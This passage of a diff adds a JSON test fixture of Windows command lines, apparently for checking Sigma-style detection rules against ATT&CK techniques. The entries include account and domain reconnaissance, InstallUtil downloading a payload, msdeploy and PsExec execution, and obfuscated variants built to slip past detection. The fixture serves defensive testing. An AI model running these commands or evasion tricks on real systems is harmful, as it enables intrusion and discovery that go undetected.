@@ -1,0 +1,2402 @@
+﻿[
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_1",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -d 10 \"security\"",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_2",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe \"-d\" 10 security",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_3",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -\"\"d 10 security",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_4",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe \"-x\" application",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_5",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -x \"application\"",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_6",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe\t-x\tapplication",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_7",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe \"-s\" system",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_8",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -s sys\"\"tem",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_9",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe \"-c\" security",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_10",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe \"-g\" system",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_11",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -g s\"ys\"tem",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_12",
+        "target_commandline":  "\"C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe\" \"-d\" 10 security",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_13",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -s \"system\"",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_14",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -c \"security\"",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_psloglist_curated_15",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\psloglist.exe -g \"system\"",
+        "target_rule":  "proc_creation_win_sysinternals_psloglist",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_nslookup_domain_discovery_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c ns\"lookup\" -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%%USERDNSDOMAIN%%",
+        "target_rule":  "proc_creation_win_nslookup_domain_discovery",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_nslookup_domain_discovery_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc.\"_msdcs.\"%%USERDNSDOMAIN%%",
+        "target_rule":  "proc_creation_win_nslookup_domain_discovery",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_nslookup_domain_discovery_curated_3",
+        "target_commandline":  "nslookup -querytype=ALL -timeout=10 \"_ldap\".\"_tcp\".\"dc\".\"_msdcs\".DomainName",
+        "target_rule":  "proc_creation_win_nslookup_domain_discovery",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_nslookup_domain_discovery_curated_4",
+        "target_commandline":  "ns\"look\"up -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.WORKGROUP",
+        "target_rule":  "proc_creation_win_nslookup_domain_discovery",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_nslookup_domain_discovery_curated_5",
+        "target_commandline":  "nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._m\"\"sdcs.WORKGROUP",
+        "target_rule":  "proc_creation_win_nslookup_domain_discovery",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_nslookup_domain_discovery_curated_6",
+        "target_commandline":  "C:\\WINDOWS\\system32\\nslookup.EXE -querytype=ALL -timeout=12 \"_ldap._tcp.dc._m\"\"sdcs.%%USERDNSDOMAIN%%\"",
+        "target_rule":  "proc_creation_win_nslookup_domain_discovery",
+        "technique_id":  "T1087"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"accounts\" /domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe accounts\t/domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"group\" \"Domain Admins\" /domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe\tgroup\t\"Domain Admins\"\t/domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"group\" \"Domain Admins\" \"/domain\"",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_6",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"group\" /domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_7",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe group /\"domain\"",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_8",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"group\" \"BUILTIN\\Backup Operators\" /domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_9",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE group \"BUILTIN\\Backup Operators\" \"/domain\"",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_10",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"group\" \"enterprise admins\" /domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_11",
+        "target_commandline":  "C:\\\\WINDOWS\\\\system32\\\\net1.exe \"accounts\" /domain",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_groups_and_accounts_recon_curated_12",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe group \"/domain\"",
+        "target_rule":  "proc_creation_win_net_groups_and_accounts_recon",
+        "technique_id":  "T1087.001"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_1",
+        "target_commandline":  "cmd.exe /c \"doskey.EXE /history \u003e  C:\\Temp\\test.txt\"",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_2",
+        "target_commandline":  "cmd.exe /c \"doskey.EXE /history \u003e C:/Temp/test.txt\"",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_3",
+        "target_commandline":  "cmd.exe /c \"doskey.EXE /history \u003e C:\\T^emp\\test.txt\"",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_4",
+        "target_commandline":  "cmd.exe /c \"doskey.EXE /history \u003e %SystemDrive%\\Temp\\test.txt\"",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_5",
+        "target_commandline":  "cmd.exe /c sc query type=service \u003e C:/Temp/out.txt",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_6",
+        "target_commandline":  "cmd.exe /c sc query type=service \u003e  C:\\Temp\\out.txt",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_7",
+        "target_commandline":  "cmd.exe /c sc query type=service 1\u003eC:\\Temp\\out.txt",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_8",
+        "target_commandline":  "C:\\WINDOWS\\system32\\doskey.EXE /history",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_9",
+        "target_commandline":  "cmd.exe /c \"tree C:\\AtomicRedTeam\\atomics \u003e C:\\TempWork\\output.txt\"",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_10",
+        "target_commandline":  "C:\\WINDOWS\\system32\\tree.COM C:\\AtomicRedTeam\\atomics \u003e C:\\Users\\testuser\\output.txt",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_11",
+        "target_commandline":  "sc query type=service",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_redirection_susp_folder_curated_12",
+        "target_commandline":  "sc.EXE   query   type=service",
+        "target_rule":  "proc_creation_win_cmd_redirection_susp_folder",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_msdt_answer_file_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\msdt.exe \"-af\" C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml",
+        "target_rule":  "proc_creation_win_lolbin_msdt_answer_file",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_msdt_answer_file_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\msdt.exe -af C:/WINDOWS/diagnostics/index/PCWDiagnostic.xml",
+        "target_rule":  "proc_creation_win_lolbin_msdt_answer_file",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_msdt_answer_file_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\msdt.exe -af C:\\WINDOWS\\diagnostics\\..\\diagnostics\\index\\PCWDiagnostic.xml",
+        "target_rule":  "proc_creation_win_lolbin_msdt_answer_file",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_msdt_answer_file_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\msdt.exe -af C:\\WINDOWS\\\"diagnostics\"\\index\\PCWDiagnostic.xml",
+        "target_rule":  "proc_creation_win_lolbin_msdt_answer_file",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_sftp_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\System32\\OpenSSH\\sftp.exe -D \"..\"",
+        "target_rule":  "proc_creation_win_lolbin_sftp",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_sftp_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\System32\\OpenSSH\\sftp.exe \"-D\" ..",
+        "target_rule":  "proc_creation_win_lolbin_sftp",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_sftp_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\System32\\OpenSSH\\sftp.exe \"-D\" \"..\"",
+        "target_rule":  "proc_creation_win_lolbin_sftp",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_sftp_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\System32\\OpenSSH\\sftp.exe -D  ..",
+        "target_rule":  "proc_creation_win_lolbin_sftp",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_gpscript_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\gpscript.exe \"/logon\"",
+        "target_rule":  "proc_creation_win_lolbin_gpscript",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_gpscript_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\gpscript.exe\t/logon",
+        "target_rule":  "proc_creation_win_lolbin_gpscript",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_gpscript_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\gpscript.exe \"/\"logon",
+        "target_rule":  "proc_creation_win_lolbin_gpscript",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_dotnet_trace_lolbin_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\dotnet-trace.exe col\"\"lect -- C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_dotnet_trace_lolbin_execution",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_dotnet_trace_lolbin_execution_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\dotnet-trace.exe collect \"--\" C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_dotnet_trace_lolbin_execution",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_dotnet_trace_lolbin_execution_curated_3",
+        "target_commandline":  "C:\\Windows\\System32\\dotnet-trace.exe collect --\tC:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_dotnet_trace_lolbin_execution",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_certoc_load_dll_curated_1",
+        "target_commandline":  "C:\\Windows\\SysWOW64\\certoc.exe \"-LoadDLL\" C:\\Windows\\System32\\version.dll",
+        "target_rule":  "proc_creation_win_certoc_load_dll",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_certoc_load_dll_curated_2",
+        "target_commandline":  "C:\\Windows\\SysWOW64\\certoc.exe -Load\"DLL\" C:\\Windows\\System32\\version.dll",
+        "target_rule":  "proc_creation_win_certoc_load_dll",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_certoc_load_dll_curated_3",
+        "target_commandline":  "C:\\Windows\\SysWOW64\\certoc.exe\t-LoadDLL\tC:\\Windows\\System32\\version.dll",
+        "target_rule":  "proc_creation_win_certoc_load_dll",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_installutil_download_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe h\"t\"tp://127.0.0.1/payload.exe",
+        "target_rule":  "proc_creation_win_installutil_download",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_installutil_download_curated_2",
+        "target_commandline":  "cmd.exe /c \"set SCHEME=http://\u0026\u0026 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe %SCHEME%127.0.0.1/payload.exe\"",
+        "target_rule":  "proc_creation_win_installutil_download",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_agentexecutor_susp_usage_curated_1",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe\" \"-remediationScript\" C:\\temp\\script.ps1",
+        "target_rule":  "proc_creation_win_agentexecutor_susp_usage",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_agentexecutor_susp_usage_curated_2",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe\" -\"remediationScript\" C:\\temp\\script.ps1",
+        "target_rule":  "proc_creation_win_agentexecutor_susp_usage",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_agentexecutor_potential_abuse_curated_1",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe\" \"-powershell\" C:\\temp\\script.ps1",
+        "target_rule":  "proc_creation_win_agentexecutor_potential_abuse",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_agentexecutor_potential_abuse_curated_2",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe\"\t-powershell C:\\temp\\script.ps1",
+        "target_rule":  "proc_creation_win_agentexecutor_potential_abuse",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_certoc_load_dll_susp_locations_curated_1",
+        "target_commandline":  "C:\\Windows\\SysWOW64\\certoc.exe \"-LoadDLL\" C:\\Users\\Public\\TestLibrary.dll",
+        "target_rule":  "proc_creation_win_certoc_load_dll_susp_locations",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_certoc_load_dll_susp_locations_curated_2",
+        "target_commandline":  "C:\\Windows\\SysWOW64\\certoc.exe -Load\"DLL\" C:\\Users\\Public\\TestLibrary.dll",
+        "target_rule":  "proc_creation_win_certoc_load_dll_susp_locations",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_msdeploy_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe\" -verb:\"sync\" -source:\"RunCommand\" -dest:\"runCommand\"=\"cmd.exe /c whoami\"",
+        "target_rule":  "proc_creation_win_lolbin_msdeploy",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_msdeploy_curated_2",
+        "target_commandline":  "\"C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe\" -verb:s\"\"ync -source:Run\"\"Command -dest:run\"\"Command=\"cmd.exe /c whoami\"",
+        "target_rule":  "proc_creation_win_lolbin_msdeploy",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_print_remote_file_copy_curated_1",
+        "target_commandline":  "\"print\" /D:\\\\127.0.0.1\\share C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_print_remote_file_copy",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_print_remote_file_copy_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\print.exe /D:\\\\127.0.0.1\\share C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_print_remote_file_copy",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_infdefaultinstall_execute_sct_scripts_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\InfDefaultInstall \"C:\\AtomicRedTeam\\atomics\\T1218\\src\\Infdefaultinstall.inf\"",
+        "target_rule":  "proc_creation_win_infdefaultinstall_execute_sct_scripts",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_infdefaultinstall_execute_sct_scripts_curated_2",
+        "target_commandline":  "\"C:\\WINDOWS\\system32\\InfDefaultInstall.exe\" \"C:\\AtomicRedTeam\\atomics\\T1218\\src\\Infdefaultinstall.inf\"",
+        "target_rule":  "proc_creation_win_infdefaultinstall_execute_sct_scripts",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_addinutil_uncommon_cmdline_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddInUtil.exe -\"AddInRoot\":C:\\Users\\Public\\Addins",
+        "target_rule":  "proc_creation_win_addinutil_uncommon_cmdline",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_devtoolslauncher_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\DevToolsLauncher.exe Launch\"For\"Deploy",
+        "target_rule":  "proc_creation_win_lolbin_devtoolslauncher",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_expand_cabinet_files_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\expand.EXE \"C:/Users/bkcs/AppData/Local/Temp/art-expand-test.cab\" -F:* .",
+        "target_rule":  "proc_creation_win_expand_cabinet_files",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_diskshadow_script_mode_susp_location_curated_1",
+        "target_commandline":  "C:\\Tools\\diskshadow.exe -s C:/temp/script.txt",
+        "target_rule":  "proc_creation_win_diskshadow_script_mode_susp_location",
+        "technique_id":  "T1218"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe st\"\"art sesshijack",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe start\tsesshijack",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"start\" sesshijack",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE start\tsesshijack",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE st\"\"art sesshijack",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_6",
+        "target_commandline":  "\"C:\\WINDOWS\\system32\\net.exe\" \"start\"",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_7",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"start\"",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_8",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"start\" sesshijack",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_9",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.exe  start",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_10",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.exe \"start\"",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_start_service_curated_11",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe start",
+        "target_rule":  "proc_creation_win_net_start_service",
+        "technique_id":  "T1569.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"C:\\Users\\bkcs\\AppData\\Local\\Temp\\psexec.exe \"-accepteula\" \\\\bkcs cmd.exe /c echo \" --access-token",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"C:\\Users\\bkcs\\AppData\\Local\\Temp\\psexec.exe -accept\"\"eula \\\\bkcs cmd.exe /c echo \" --access-token",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_3",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"C:\\Users\\bkcs\\AppData\\Local\\Temp\\psexec.exe\t-accepteula \\\\bkcs cmd.exe /c echo \" --access-token",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_4",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe \\\\localhost -i -u DOMAIN\\Administrator -p P@ssw0rd1 \"-accepteula\" C:\\Windows\\System32\\calc.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_5",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe \\\\localhost -i -u DOMAIN\\Administrator -p P@ssw0rd1\t-accepteula C:\\Windows\\System32\\calc.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_6",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe \\\\localhost -i -u DOMAIN\\Administrator -p P@ssw0rd1 -accept\"\"eula C:\\Windows\\System32\\calc.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_7",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe \\\\localhost \"-accepteula\" -c C:\\Windows\\System32\\cmd.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_8",
